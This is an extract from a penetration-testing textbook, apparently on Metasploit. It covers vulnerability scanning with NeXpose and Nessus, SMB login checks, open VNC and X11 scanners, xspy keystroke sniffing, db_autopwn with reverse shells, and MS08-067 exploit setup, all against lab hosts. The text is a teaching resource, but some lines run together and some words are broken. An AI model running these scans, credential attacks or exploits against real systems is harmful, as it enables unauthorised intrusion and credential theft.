+[*] Importing 'NeXpose Simple XML' data[*] Importing host 192.168.1.195[*] Successfully imported /tmp/host_195.xml
+msf > db_hosts -c address,svcs,vulns
+Hosts
+=====
+address        Svcs  Vulns  Workspace
+-------        ----  -----  ---------
+192.168.1.195  8    268 X default
+To display the full details of the vuln erabilities imported into Metasploit, 
+including Common Vulnerabilities and Exposures (CVE) numbers and other 
+references, run the following:
+msf > db_vulns
+As you can see, running an overt vuln erability scan with full credentials 
+can provide an amazing amount of in formation—268 vuln erabilities found 
+
+
+Vulnerability Scanning 43in this case. But, of course, this has been  a very noisy scan, likely to attract lots 
+of attention. These types of vulnerabi lity scans are best used in a pen test 
+where being stealthy is not required.
+Running NeXpose Within MSFconsole
+Running NeXpose from the web GUI is great for fine-tuning vulnerability scans and generating reports, bu t if you prefer to remain in msfconsole , you 
+can still run full vulnerability scans with the NeXpose plug-in included in Metasploit.
+To demonstrate the difference in results between a credentialed and non-
+credentialed scan, we will run a scan fr om with Metasploit without specifying 
+a username and password for the target system. Before you begin, delete any 
+existing database with 
+db_destroy , create a new database in Metasploit with 
+db_connect , and then load the NeXpose plug-in with load nexpose  as shown next:
+msf > db_destroy postgres:toor@127.0.0.1/msf3
+[*] Warning: You will need to enter the password at the prompts belowPassword:
+msf > db_connect postgres:toor@127.0.0.1/msf3
+msf > load nexpose
+[*] NeXpose integration has been activated
+[*] Successfully loaded plugin: nexpose
+With the NeXpose plug-in loaded, have  a look at the commands loaded 
+specifically for the vulnerability scanner by entering the help command. You 
+should see a series of new commands at the top of the listing specific to run-
+ning NeXpose.
+msf > help
+Before running your first scan from msfconsole , you will need to connect 
+to your NeXpose installation. Enter nexpose_connect -h  to display the usage 
+required to connect; add your username, password, and host address; and accept the SSL certificate warning by adding 
+ok to the end of the connect 
+string:
+msf > nexpose_connect -h
+[*] Usage:[*]        nexpose_connect username:password@host[:port] <ssl-confirm>[*]         -OR-[*]        nexpose_connect username password host port <ssl-confirm>msf > nexpose_connect dookie:s3cr3t@192.168.1.206 ok
+[*] Connecting to NeXpose instance at 192.168.1.206:3780 with username dookie...
+Now enter nexpose_scan  followed by the target IP a ddress to initiate a scan, as 
+shown next. In this example, we are sc anning a single IP address, but you 
+
+44 Chapter 4could also pass a range of hosts to the scanner (192.168.1.1-254) or a subnet 
+in Classless Inter-Domain Routing (CIDR) notation (192.168.1.0/24).
+msf > nexpose_scan 192.168.1.195
+[*] Scanning 1 addresses with template pentest-audit in sets of 32[*] Completed the scan of 1 addresses
+msf >
+After the NeXpose scan completes, the database you created earlier 
+should contain the results of the vulnerab ility scan. To view the results, enter 
+db_hosts , as shown next. (In this example, th e output has been trimmed by filter-
+ing on the address column.)
+msf > db_hosts -c address
+Hosts
+=====
+address        Svcs  Vulns  Workspace
+-------        ----  -----  ---------
+192.168.1.195  8    7     default
+msf >
+As you can see, NeXpose has discov ered seven vulnerabilities. Run db_vulns  
+to display the vulnerabilities found:
+msf > db_vulns
+Although this scan has found significan tly fewer than the 268 vulnerabilities 
+discovered with ou r prior use of NeXpose through the GUI with credentials, 
+you should have enough vulnerabilities here to get a great head start on exploiting the system.
+Scanning with Nessus
+The Nessus vulnerability scanne r from Tenable Security ( http://www.tenable
+.com/ ) is one of the most widely used vulnerability scanners. Metasploit’s 
+Nessus plug-in lets you launch scans and pull information from Nessus scans 
+via the console, but in the example th at follows, we’ll import Nessus scan 
+results independently. Using Nessus 4.4. 1 with a free Home Feed, we’ll run 
+this scan against the same  target we’ll use througho ut this chapter, with 
+known credentials. In these early stag es of a penetration test, the more 
+tools you can use to fine-tune yo ur future attacks, the better.
+Nessus Configuration
+After you have downloaded and installe d Nessus, open your web browser and 
+navigate to https://<youripaddress>:8834 , accept the certificate warning, and 
+log into Nessus using the credentials you created during installation. You should see the main Nessus window, as shown in Figure 4-11.
+
+Vulnerability Scanning 45Figure 4-11: The main Nessus window
+On login, you will see the Reports section, where any prior vulnerability 
+scans should be listed. Along the top of the interface, you should see the Scans 
+tab, where you can create and view scanni ng tasks; the Policies tab, where you 
+configure Nessus to include various plug-ins you want to use in your scans; 
+and the Users tab, where you can add user accounts to the Nessus server.
+Creating a Nessus Scan Policy
+Before beginning a scan, you first need to create a Nessus scan policy. On the 
+Policies tab, click the green Add button to open the policy configuration win-
+dow shown in Figure 4-12.
+Figure 4-12: The Nessus Policies configuration window
+
+
+46 Chapter 4You’ll see many available options, al l of which can be found in Nessus’s 
+documentation.
+1. Enter a name for the scan , as shown in Figure 4-13. We will use the name 
+The_Works in our example to have Nessus  run all of its checks. Then 
+click Next .
+2. As with the NeXpose scan conducted ea rlier, we will configure this scan 
+to use Windows login credentials to get a more complete picture of the 
+vulnerabilities present on the target  system. Enter the login credentials 
+for your target system and click Next .
+Figure 4-13: The Ness us General settings
+3. On the Plugins page, you can choose from a large variety of Nessus plug-
+ins for Windows, Linux, BSD, and mo re. If, during a scan, you know you 
+are going to scan only Windows-base d systems, for example, you could 
+deselect many of these plug-ins for yo ur first run-through; for now, click 
+Enable All  (shown in the lower-right corner of Figure 4-14) and then 
+click Next .
+Figure 4-14: Selecting Nessus scan plug-ins
+
+
+Vulnerability Scanning 474. The final step in setting up the new policy is the Preferences page. Here, 
+you can direct Nessus not to scan frag ile devices such as network printers, 
+configure it to store results in an ex ternal database, provide login creden-
+tials, and more. When you are done with your selections, click Submit  to 
+save the new policy. Your newly adde d policy should be displayed under 
+Policies, as shown in Figure 4-15.
+Figure 4-15: The newly added policy in Nessus
+Running a Nessus Scan
+After you have created a scan policy, yo u are ready to configure a scan. Begin 
+by selecting the Scans  tab, and then click the Add button to open the scan 
+configuration window. Most Nessus configur ation is set in its scan policies, so 
+when you’re setting up a scan, enter a na me for the scan, choose a policy, and 
+enter the scan targets, as  shown in Figure 4-16.
+Figure 4-16: Config uring a Nessus scan
+In our example, we are scanning only  one host, but you can also enter IP 
+address ranges in CIDR nota tion or even upload a file  containing the addresses 
+of the targets you want to scan. When you are satisfied with the scan configu-
+ration, click Launch Scan .
+Nessus Reports
+After the scan is complete, it will no longer appear under Scans, and you 
+should find a new entry under the Repo rts tab listing the name of the scan, 
+its status, and when it was last upd ated. Select the report and click Browse  to 
+
+
+48 Chapter 4open a summary page of the scan that sh ows the severity levels of the vulner-
+abilities found, as shown in Figure 4-17.
+Figure 4-17: Our Nessus scan report summary
+NOTE Bear in mind that because this scan was run with Windows credentials, Nessus will 
+find many more vulnerabilities than it would with an anonymous scan.
+Importing Results into the Metasploit Framework
+Now let’s import our results into the Framework.
+1. Click the Download Report  button on the Reports ta b to save the results 
+to your hard drive. The default file format for Nessus reports, .nessus , can 
+be parsed by Metasploit, so click Submit  when prompted to select the 
+default format.
+2. Load msfconsole , create a new database with db_connect , and import the 
+Nessus results file by entering db_import  followed by the report filename.
+msf > db_connect postgres:toor@127.0.0.1/msf3
+msf > db_import /tmp/nessus_report_Host_195.nessus
+[*] Importing 'Nessus XML (v2)' data
+[*] Importing host 192.168.1.195
+3. To verify that the scanned host and vulnerability data was imported 
+properly, enter db_hosts  as shown next. This should output a brief list-
+ing with the target IP address, the number of services detected, and the 
+number of vulnerabilities found by Nessus.
+msf > db_hosts -c address,svcs,vulns
+Hosts
+=====address        svcs  vulns-------        ----  -----
+192.168.1.195  18    345
+
+
+Vulnerability Scanning 494. For a complete listing of the vulner ability data that was imported into 
+Metasploit, enter db_vulns  without any switches, as shown here:
+msf > db_vulns
+[*] Time: Wed Mar 09 03:40:10 UTC 2011 Vuln: host=192.168.1.195 
+name=NSS-10916 refs=OSVDB-755
+[*] Time: Wed Mar 09 03:40:10 UTC 2011 Vuln: host=192.168.1.195 
+name=NSS-10915 refs=OSVDB-754
+[*] Time: Wed Mar 09 03:40:11 UTC 2011 Vuln: host=192.168.1.195 
+name=NSS-10913 refs=OSVDB-752
+[*] Time: Wed Mar 09 03:40:12 UTC 2011 Vuln: host=192.168.1.195 
+name=NSS-10114 refs=CVE-1999-0524,OSVDB-94,CWE-200
+[*] Time: Wed Mar 09 03:40:13 UTC 2011 Vuln: host=192.168.1.195 
+name=NSS-11197 refs=CVE-2003-0001,BID-6535
+At the end of your pen test, having these references available can be of 
+great assistance when you’re writing the report for your client.
+Scanning with Nessus from Within Metasploit
+During those times when you don’t fe el like leaving the comfort of the 
+command line, you can use the Nessus Bridge plug-in ( http://blog.zate.org/
+nessus-plugin-dev/ ) by Zate within Metasploit. The Nessus Bridge allows you to 
+control Nessus completely through the Metasploit Framework, run scans, 
+interpret results, and launch attacks ba sed on the vulnerabilities identified 
+through Nessus.
+1. As in the preceding examples, first de stroy the existing database with the 
+db_destroy  command and create a new one using db_connect .
+2. Load the Nessus plug-in by running load nessus , as shown here:
+msf > db_destroy postgres:toor@127.0.0.1/msf3
+[*] Warning: You will need to enter the password at the prompts belowPassword:
+msf > db_connect postgres:toor@127.0.0.1/msf3
+msf > load nessus
+[*] Nessus Bridge for Metasploit 1.1[+] Type nessus_help for a command listing[+] Exploit Index - (/root/.msf3/nessus_index) -  is valid.
+[*] Successfully loaded plugin: Nessus
+3. Running the command nessus_help  will display all of the commands that 
+the plug-in supports. The Bridge undergoes regular development and updates, so it is a good idea to chec k the help output pe riodically to see 
+what new features, if any, have been added.
+
+50 Chapter 44. Before starting a scan with the Bridge, you first need to authenticate to 
+your Nessus server using nessus_connect , as shown here:
+msf > nessus_connect dookie:s3cr3t@192.168.1.101:8834 ok
+[*] Connecting to https://192.168.1.101:8834/ as dookie
+[*] Authenticated
+5. As with the GUI version of Nessus, you need to initiate a scan using a 
+defined policy by its policy ID number. To list the available scan policies on the server, use 
+nessus_policy_list :
+msf > nessus_policy_list
+[+] Nessus Policy List
+ID  Name       Comments
+--  ----       ---------4 Internal Network Scan-3 Web App Tests-2 Prepare for PCI DSS audits-1 External Network Scan
+2 The_Works
+6. Take note of the policy ID you want to use for your scan, and then launch 
+a new scan with nessus_scan_new  followed by the policy number, a name 
+for your scan, and your target  IP address as shown next:
+msf > nessus_scan_new
+[*] Usage:
+[*]        nessus_scan_new <policy id> <scan name> <targets>
+[*]        use nessus_policy_list to list all available policiesmsf > nessus_scan_new 2 bridge_scan 192.168.1.195
+[*] Creating scan from policy number 2, called "bridge_scan" and scanning 192.168.1.195
+[*] Scan started.  uid is d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e
+7. While your scan is in progress, yo u can see its status by running the  
+nessus_scan_status  command. When this command’s output responds 
+with “No Scans Running,” as shown ne xt, you will know that your scan 
+has completed.
+msf > nessus_scan_status
+[*] No Scans Running.
+8. After the scan has comple ted, you can list the avai lable scan reports with 
+the nessus_report_list  command. Identify the ID of the report you want 
+to import and enter nessus_report_get  to download the report and import 
+it into the Metasploit database automatically.
+msf > nessus_report_list
+[+] Nessus Report List
+
+Vulnerability Scanning 51ID                                                    Name         Status     Date
+--                                                    ----         ------     ----074dc984-05f1-57b1-f0c9-2bb80ada82fd3758887a05631c1d  Host_195     completed  19:43 Mar 08 2011d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e  bridge_scan  completed  09:37 Mar 09 2011
+[*] You can:
+[*] Get a list of hosts from the report: nessus_report_hosts <report id>msf > nessus_report_get d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e
+[*] importing d2f1fc02-3b50-4e4e-ab8f-38b0813dd96abaeab61f312aa81e[*] 192.168.1.195 Microsoft Windows XP Professional (English)  Done!
+[+] Done
+9. Finally, as with the other import func tions demonstrated in this chapter, 
+you can use db_hosts  to verify that the scan da ta was imported successfully:
+msf > db_hosts -c address,svcs,vulns
+Hosts
+=====
+address        svcs  vulns
+-------        ----  -----
+192.168.1.195  18    345
+Now that you’ve seen the variation in scan results from two different 
+products, you should have a better sense of the merit in using more than one tool for your scanning needs. It is still up to the penetration tester to interpret 
+the results from these automated tools and turn them into actionable data.
+Specialty Vulner ability Scanners
+Although many commercial vulnerability sc anners are available on the market, 
+you are not limited to them. When you wa nt to run a scan for a specific vul-
+nerability across a network, Metasploit’s many auxiliary modules can help you accomplish such tasks. 
+The following Metasploit modules are just a few examples of the many 
+useful auxiliary scanning modules included in the Framework. Take advan-tage of your lab to probe and expl ore as many of them as you can.
+Validating SMB Logins
+To check the validity of a username and password combination, use the SMB 
+Login Check Scanner to connect to a ra nge of hosts. As you might expect, 
+this scan is loud and noticeable, and ea ch login attempt will show up in the 
+event logs of every Windows box it encounters.
+After selecting the smb_login  module with use, you can run show_options  to 
+see the settings listed under the Requir ed column. Metasploit allows you to 
+specify a username and password combin ation, a username and password list, 
+or a combination of either . In the next example, RHOSTS  is set to a small range 
+of IP addresses and a username and pa ssword are configured for Metasploit 
+to try against all addresses.
+
+52 Chapter 4msf > use auxiliary/scanner/smb/smb_login
+msf auxiliary(smb_login) > show options
+Module options:   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   PASS_FILE                       no        File containing passwords, one per line
+   RHOSTS                          yes       The target address range or CIDR identifier   RPORT          445              yes       Set the SMB service port   SMBDomain      WORKGROUP        no        SMB Domain   SMBPass        password         no        SMB Password   SMBUser        Administrator    no        SMB Username
+   THREADS        50               yes       The number of concurrent threads
+   USERPASS_FILE                   no        File containing users and passwords separated
+by space, one pair per line
+   USER_FILE                       no        File containing usernames, one per line
+msf auxiliary(smb_login) > set RHOSTS 192.168.1.150-155
+RHOSTS => 192.168.1.170-192.168.1.175
+msf auxiliary(smb_login) > set SMBUser Administrator
+SMBUser => Administratormsf auxiliary(smb_login) > set SMBPass s3cr3t
+SMBPass => s3cr3tmsf auxiliary(smb_login) > run
+[*] Starting host 192.168.1.154
+[*] Starting host 192.168.1.150
+[*] Starting host 192.168.1.152[*] Starting host 192.168.1.151[*] Starting host 192.168.1.153[*] Starting host 192.168.1.155
+X [+] 192.168.1.155 - SUCCESSFUL LOGIN (Windows 5.1) 'Administrator' : 's3cr3t'
+[*] Scanned 4 of 6 hosts (066% complete)
+[*] Scanned 5 of 6 hosts (083% complete)[*] Scanned 6 of 6 hosts (100% complete)[*] Auxiliary module execution completed
+msf auxiliary(smb_login) >
+You can see a successful login with user Administrator  and a password of 
+s3cr3t  at X. Because workstations are all cloned from one image and deployed 
+through the enterprise in many corp orate environments, the administrator 
+password may well be the same on all of them, granting you access to every 
+workstation on the network.
+Scanning for Open VN C Authentication
+Virtual network computing (VNC) provid es graphical access to remote sys-
+tems in a way that’s similar to Micros oft’s Remote Desktop. VNC installations 
+are common throughout corporations, because they provide a GUI-based view of server and workstation desktops. VNC is frequently installed to meet a 
+temporary need and then completely forgotten and left unpatched, creating 
+
+Vulnerability Scanning 53a major potential vulnerability. Metasp loit’s built-in VNC Authentication 
+None scanner searches a range of IP addresses for VNC servers that do not 
+have a password configured (that supp ort “None” authentication, meaning a 
+blank password). Usually, this scan will turn up nothing of value, but a good penetration tester leaves no stone un turned when looking for ways access a 
+target system.
+NOTE Recent VNC servers do not allow blank passwords. To set one up in your lab for testing, 
+use older VNC servers such as RealVNC 4.1.1.
+The VNC scanner, like most Metasploit  auxiliary modules, is easy to con-
+figure and run. The only required configuration for vnc_none_auth  is to supply 
+it with an IP or a range of IPs to scan. Simply select the module, define your 
+RHOSTS  and THREADS , if desired, and run it, as shown next:
+msf > use auxiliary/scanner/vnc/vnc_none_auth
+msf auxiliary(vnc_none_auth) > show options
+Module options:   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------   RHOSTS                    yes       The target address range or CIDR identifier   RPORT    5900             yes       The target port   THREADS  1                yes       The number of concurrent threads
+msf auxiliary(vnc_none_auth) > set RHOSTS 192.168.1.155
+RHOSTS => 192.168.1.155msf auxiliary(vnc_none_auth) > run
+[*] 192.168.1.155:5900, VNC server protocol version : RFB 003.008
+[*] 192.168.1.155:5900, VNC server security types supported : None
+X [*] 192.168.1.155:5900, VNC server security types includes None, free access!
+[*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed
+msf auxiliary(vnc_none_auth) >
+If you get lucky and Metasploit find s a VNC server with no authentica-
+tion X, you can use Back|Track’s vncviewer  to connect to the target machine 
+without a password, as shown in Figure 4-18.
+Figure 4-18: Connecting to VNC with no authentication using vncviewer
+
+
+54 Chapter 4If you think a VNC scan is likely to be  a waste of time and that you’ll never 
+find systems with open VNC servers en abled, think again. During a large 
+penetration test, which included thousa nds of systems, one of the authors 
+noticed that one of those systems had an open VNC server. 
+While the author was in the system documenting his finding, he noticed 
+activity on the system. This was overni ght on a system that was unlikely to 
+have an authorized user on it. While not always considered a best practice, 
+the author pretended to be another unauthorized intruder and engaged the intruder in conversation via Notepad. The intruder was not very bright and told the author that he was scanning large blocks of systems for open VNC 
+servers. Here is a segment of the conversation:
+Author:  You in the us? or out of country? I know some people 
+in denmark.
+Attacker:  I’m from Norway actually, hehe, I have relatives 
+in Denmark.
+Author:  You hang in any boards? like I used to like some but they 
+have been going away
+Attacker:  I mostly hang in some programming boards, but not much 
+else. Have you been into hacking for a long time or what? What’s 
+your age btw? I’m 22.
+Author:  I have been on this for like fun for around a year or so. Still 
+in school. 16. Just something to do.
+Attacker:  Haven’t been there. I too mostly do this for fun, just trying 
+to see what I can do, test my skills. I wrote the “VNC finder” myself btw, I have found a lot of servers, but this is the only one where I 
+could actually have some fun
+Author:  Wow. What did you write it in? Can I dl it? Do you have 
+a handle?
+Attacker:  It’s written in a language called PureBasic, but it’s kinda 
+not ready for release yet, it’s only for my own use. But maybe I can 
+share it anyway, I could upload the code somewhere and let you compile it. That is if you can find some PureBasic compiler on 
+some warez site :P
+Author: Thats cool. you can put it in that pastebin site from irc. 
+That lets you anon post I have not done purebasic before. just 
+python and perl
+Attacker:  Let me see, I'll look for that pastebin site and upload it, 
+just give me some minutes, I’ll be around.
+The attacker then gave the author a li nk to a pastebin page with the full 
+source for the custom VN C scanner he was using.
+Scanning for Open X11 Servers
+Metasploit’s built-in open_x11 scanner  is similar to the vnc_auth scanner, 
+in that it scours a range of hosts for X11 servers that allow users to connect 
+without authentication. Although X11 serv ers aren’t widely used today, lots 
+
+Vulnerability Scanning 55of archaic boxes out there are still ru nning old, unpatched, and forgotten 
+operating systems. As you’ve seen in the preceding two examples, legacy sys-
+tems are often the most vuln erable systems on a network.
+To run the open_x11 scanner, simply configure as you would most other 
+auxiliary modules by setting the RHOSTS  and, optionally, the THREADS  values. A 
+session is shown next. Notice at IP a ddress 192.168.1.23 that the scanner has 
+found an open X server. This is a serious vulnerability because it allows an attacker to gain unauthenticated acce ss to the system: The X system handles 
+the GUI including the mouse and keyboard.
+msf > use auxiliary/scanner/x11/open_x11
+msf auxiliary(open_x11) > show options
+Module options:   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------   RHOSTS                    yes       The target address range or CIDR identifier   RPORT    6000             yes       The target port   THREADS  1                yes       The number of concurrent threads
+msf auxiliary(open_x11) > set RHOSTS 192.168.1.0/24
+RHOSTS => 192.168.1.0/24msf auxiliary(open_x11) >  set THREADS 50
+THREADS => 50msf auxiliary(open_x11) > run
+[*] Trying 192.168.1.1[*] Trying 192.168.1.0[*] Trying 192.168.1.2...[*] Trying 192.168.1.29[*] Trying 192.168.1.30[*] Open X Server @ 192.168.1.23 (The XFree86 Project, Inc)[*] Trying 192.168.1.31[*] Trying 192.168.1.32
+. . . SNIP . . .[*] Trying 192.168.1.253
+[*] Trying 192.168.1.254[*] Trying 192.168.1.255
+[*] Auxiliary module execution completed
+To see what an attacker could do with  a vulnerability like this, start key-
+stroke logging using Back|Track’s xspy tool, like so:
+root@bt:/# cd /pentest/sniffers/xspy/
+root@bt:/pentest/sniffers/xspy# ./xspy -display 192.168.1.23:0 -delay 100
+ssh root@192.168.1.11(+BackSpace)37
+sup3rs3cr3tp4s5w0rdifconfig
+exit
+
+56 Chapter 4The xspy tool remotely sniffs the X serv er’s keyboard session and has cap-
+tured a user running SSH to log in as ro ot on a remote system. Vulnerabilities 
+such as this can be rare, but when you find them they are extremely valuable.
+Using Scan Results for Autopwning
+Let’s take a quick diversion into exploi tation. Metasploit’s Autopwn tool auto-
+matically targets and exploits a system us ing an open port or using the results 
+of a vulnerability scan ex port. You can use Autopwn to  harness the results of 
+most vulnerability sca nners, including NeXpose, Nessus, and OpenVAS.
+For example, here’s how we could use a Nessus results import to target a 
+system and autopwn it. Create a new database with db_connect  and use db_import  
+to import the scan report. In  the next example, we run db_autopwn  with a 
+series of switches to launch attacks against all targets ( e), show all matching 
+modules ( t), use a reverse shell payload ( r), select exploit modules based on 
+vulnerability ( x), and also select based on open ports ( p). Once db_autopwn  
+launches, Metasploit begins launching exploits at the targets. Successful exploits return a shell to the attacking machine.
+msf > db_connect postgres:toor@127.0.0.1/msf3
+msf > db_import /root/nessus.nbe
+msf > db_autopwn –e –t –r -x -p 
+X [*] (1/72 [0 sessions]): Launching exploit/windows/mssql/ms09_004_sp_replwritetovarbin
+against 192.168.33.130:1433...
+[*] (2/72 [0 sessions]): Launching exploit/windows/smb/psexec against 192.168.33.130:445...[*] (3/72 [0 sessions]): Launching exploit/windows/smb/ms06_040_netapi against
+192.168.33.130:445...
+. . . SNIP . . .[*] Transmitting intermediate stager for over-sized stage...(216 bytes)
+[*] Sending stage (718336 bytes)
+Y [*] Meterpreter session 1 opened  (192.168.1.101:40912 -> 192.168.1.115:15991)
+[*] (72/72 [1 sessions]): Waiting on 2 launched modules to finish execution...
+[*] (72/72 [1 sessions]): Waiting on 0 launched modules to finish execution...
+Based on these scans, Auto pwn launched 72 exploits X and one was suc-
+cessful, as shown at Y. This exploit allows us full access to the machine with a 
+Meterpreter console that will be discu ssed in far more depth in Chapter 6.
+NOTE One big caveat to remember when using Autopwn: If you’re going in with your Autopwn 
+guns blazing, the target system can crash or  lose stability. Autopwn has useful features 
+not covered here, such as the ability to select only exploits that have  an “Excellent” rank-
+ing, meaning it is very unlikely they will crash the remote system or service. For more 
+information on its usage, enter db_autopwn –h .
+
+THE JOY OF EXPLOITATION
+Exploitation is the pinnacle of many security profes-
+sionals’ careers. The ability to gain full control over a 
+targeted machine is a great fe eling, if perhaps a little 
+scary. But even though expl oitation techniques have 
+advanced quite a bit over the years, the adoption of various system and networ k protections has made it
+increasingly more difficult to succeed with basic exploits. In this chapter, 
+we move into more difficult attack methods, beginning with command-line 
+interfaces to the Metasploit Framework. Most of the attacks and customizations 
+discussed in this chapter will occur in msfconsole , msfencode , and msfpayload .
+Before you begin to exploit systems, you need to understand a few 
+things about penetration testing and exploitation. In Chapter 1 you were introduced to basic penetration testin g methods. In Chap ter 2 you learned 
+the basics of the Framework and what to  expect from each tool. In Chapter 3 
+we explored the intelligence gatherin g phase, and in Chapter 4 you learned 
+about vulnerability scanning.
+In this chapter, we focus on the basi cs of exploitation. Our goal is to 
+familiarize you with the different co mmands available through the Frame-
+work, which we’ll build upon in later ch apters. Most of the attacks from this 
+
+58 Chapter 5point forward will occur through msfconsole , and you will need a solid under-
+standing of msfconsole , msfpayload , and msfencode  to get the most out of the 
+balance of this book.
+Basic Exploitation
+The Metasploit Framework contains hund reds of modules, and it’s nearly 
+impossible to remember  them all. Running show from msfconsole  will display 
+every module available in the Framework, but you can also narrow your search 
+by displaying only specific types of modules as discussed in the following 
+sections.
+msf> show exploits
+Within msfconsole , exploits operate against the vulnerabilities that you dis-
+cover during a penetration test. New ex ploits are always being developed, 
+and the list will continue to grow. This command will display every currently available exploit within the Framework.
+msf> show auxiliary
+Auxiliary modules in Metasploit can be  used for a wide range of purposes. 
+They can operate as scanners, denial-o f-service modules, fuzzers, and much 
+more. This command will display them and list their features.
+msf> show options
+Options control various settings need ed for proper functionality of the 
+Framework modules. When you run show options  while a module is selected, 
+Metasploit will display only the options that apply to that particular module. 
+Entering msf> show options  when not in a module will display the available 
+global options—for example, you can set LogLevel  to be more verbose as you 
+perform an attack. You can also issue the back command to go back once 
+inside a module.
+msf > use windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) > back
+msf >
+The search  command is useful for finding a specific attack, auxiliary 
+module, or payload. For example, if yo u want to launch an attack  against 
+SQL, you could search for SQL like this:
+msf > search mssql
+[*] Searching loaded modules for pattern 'mssql'...
+
+The Joy of Exploitation 59Auxiliary
+=========
+   Name                       Disclosure Date  Rank    Description
+   ----                       ---------------  ----    -----------   admin/mssql/mssql_enum                      normal  Microsoft SQL Server Configuration
+Enumerator
+   admin/mssql/mssql_exec                      normal  Microsoft SQL Server xp_cmdshell
+Command Execution
+   admin/mssql/mssql_idf                       normal  Microsoft SQL Server - Interesting
+Data Finder
+   admin/mssql/mssql_sql                       normal  Microsoft SQL Server Generic Query   scanner/mssql/mssql_login                   normal  MSSQL Login Utility   scanner/mssql/mssql_ping                    normal  MSSQL Ping UtilityExploits
+. . . SNIP . . .
+msf >
+Or, to find the MS08-067 exploit spec ifically (an exploit related to the 
+notorious Conficker worm that exploi ted a weakness within the Remote 
+Procedure Call [RPC] service), you would enter this command:
+msf > search ms08_067
+[*] Searching loaded modules for pattern 'ms08_067'...
+Exploits
+========
+   Name                         Rank   Description
+   ----                         ----   -----------
+   windows/smb/ms08_067_netapi   great  Microsoft Server Service Relative Path Stack Corruption
+Then, having found an exploit ( windows/smb/ms08_067_netapi ), you could 
+load the found module with the use command, like so:
+msf > use windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) >
+Notice that when we issue the use windows/smb/ms08_067_netapi  command, 
+the msf prompt changes as follows:
+msf exploit(ms08_067_netapi) >
+This indicates that we have selected the ms08_067_netapi  module and 
+that commands issued at this prompt will be performed under that exploit.
+
+60 Chapter 5NOTE You can perform a search  or use at any time within an exploit to switch to a different 
+exploit or module.
+Now, with the prompt reflecting our chosen module, we can enter show 
+options  to display the options specif ic to the MS08-067 exploit:
+msf exploit(ms08_067_netapi) > show options
+Module options:   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------   RHOST                     yes       The target address   RPORT    445              yes       Set the SMB service port   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+Exploit target:
+   Id  Name
+   --  ----   0   Automatic Targeting
+msf exploit(ms08_067_netapi) >
+This contextual approach  to accessing options keeps the interface simpler 
+and allows you to focus only on the options that matter at the moment.
+msf> show payloads
+Recall from Chapter 2 that payloads ar e platform-specific portions of code 
+delivered to a target. As with show options , when you run show payloads  from a 
+module-specific prompt, Metasploit displays only the payloads that are com-patible with that module. In the case  of Microsoft Wind ows–based exploits, 
+these payloads may be as simple as a command prompt on the target or as 
+complex as a full graphical interface on the target machine. To see an active 
+list of payloads, run the following command:
+msf> show payloads
+This would show you all payloads available in Metasploit; however, if you 
+are in an actual exploit, you will see only payloads applic able to the attack. 
+For example, running show payloads  from the msf exploit(ms08_067_netapi)  
+prompt would result in the output shown next.
+In the previous example we sear ched for the MS08-067 module. Now 
+let’s find out the payloads fo r that module by entering show payloads . Notice 
+in the example that only  Windows-based payloads are shown. Metasploit 
+will generally identify the type of payl oads that can be used with a particu-
+lar attack.
+
+The Joy of Exploitation 61msf exploit(ms08_067_netapi) > show payloads
+Compatible Payloads
+===================
+Name                                             Rank    Description
+---- ---- -----------
+. . . SNIP . . .windows/shell/reverse_ipv6_tcp                   normal  Windows Command Shell, Reverse TCP
+Stager (IPv6)
+windows/shell/reverse_nonx_tcp                normal  Windows Command Shell, Reverse TCP
+Stager (No NX or Win7)
+windows/shell/reverse_ord_tcp                 normal  Windows Command Shell, Reverse
+Ordinal TCP Stager (No NX or Win7)
+windows/shell/reverse_tcp                     normal  Windows Command Shell, Reverse TCP
+Stager
+windows/shell/reverse_tcp_allports            normal  Windows Command Shell, Reverse
+All-Port TCP Stager
+windows/shell_bind_tcp                        normal  Windows Command Shell, Bind TCP
+Inline
+windows/shell_reverse_tcp                     normal  Windows Command Shell, Reverse TCP
+Inline
+Next, we enter set payload windows/shell/reverse_tcp  to select the reverse_tcp  
+payload. When we enter show options  again we see that additional options 
+are shown:
+msf exploit(ms08_067_netapi) > set payload windows/shell/reverse_tcp X
+payload => windows/shell/reverse_tcpmsf exploit(ms08_067_netapi) > show options Y
+Module options:   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------   RHOST                     yes       The target address   RPORT    445              yes       Set the SMB service port   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+ZPayload options (windows/shell/reverse_tcp):
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------   EXITFUNC  thread           yes       Exit technique: seh, thread, process   LHOST                      yes       The local address
+   LPORT     4444             yes       The local port
+
+62 Chapter 5Notice that when the payload is selected at X and the options are dis-
+played at Y, we are presented with some additional options in the payload 
+section at Z, such as LHOST  and LPORT . In this example, you could configure 
+the payload to connect back to the atta cker machine on a specific IP address 
+and port number, called a reverse payload . In reverse payloads, the connection 
+is actually triggered by the target ma chine and it connects to the attacker. 
+You might use this techni que to circumvent a fire wall or NAT installation. 
+We’ll configure this exploit with both the LHOST  and RHOST  options. LHOST , 
+our attacking machine, will connect  back from the target machine ( RHOST ) on 
+the default TCP port (4444). 
+msf> show targets
+Modules often list vulnerable potential targets. For example, because the vul-
+nerability targeted by MS08-067 relies on hard-coded memory addresses, the 
+exploit is specific to operating system s with specific patch levels, language 
+version, and security implementations (a s explained in detail in Chapters 14 
+and 15). Using the show targets  command at the msf MS08-067  prompt displays 
+a list of 60 exploit targets (with only  a portion shown in the following exam-
+ple). The success of the exploit will de pend on the version of Windows you 
+are targeting. Sometimes automatic de tection will not work and could even 
+trigger the wrong exploit, which will usually lead to a service crash.
+msf exploit(ms08_067_netapi) > show targets
+Exploit targets:   Id  Name
+   --  ----
+X   0   Automatic Targeting
